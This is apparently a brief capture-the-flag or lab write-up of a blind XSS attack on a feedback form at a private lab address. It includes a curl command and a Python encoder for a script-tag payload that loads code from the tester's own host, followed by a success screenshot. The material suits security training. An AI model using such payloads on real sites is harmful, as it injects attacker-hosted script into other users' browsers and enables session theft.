# id: 10.10.242.129

# capture the post message

http://10.10.242.129:8080/submit_feedback
![](https://velog.velcdn.com/images/agnusdei1207/post/e0dc890b-369c-4bb8-9cad-4ceda9ab9ea1/image.png)

```
POST /submit_feedback HTTP/1.1
Host: 10.10.242.129:8080
Content-Length: 14
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.242.129:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.242.129:8080/submit_feedback
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

feedback=asdad

# Blind XSS check

curl -X POST http://10.10.242.129:8080/submit_feedback -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://10.10.242.129:8080" -H "Referer: http://10.10.242.129:8080/submit_feedback" --data "feedback=<script src="http://10.8.136.212:8000/"></script>"

# setting payload

```python
import urllib.parse

def url_encode(text: str) -> str:
    return urllib.parse.quote(text)

def url_decode(encoded_text: str) -> str:
    return urllib.parse.unquote(encoded_text)

original = "<script src="http://10.8.136.212:8000/"></script>"
encoded = url_encode(original)
decoded = url_decode(encoded)

print("original:", original)
print("encoded:", encoded)
print("decoded:", decoded)

```

# success the blind XSS

![](https://velog.velcdn.com/images/agnusdei1207/post/b5252105-4522-428d-a133-2239d228ac67/image.png)
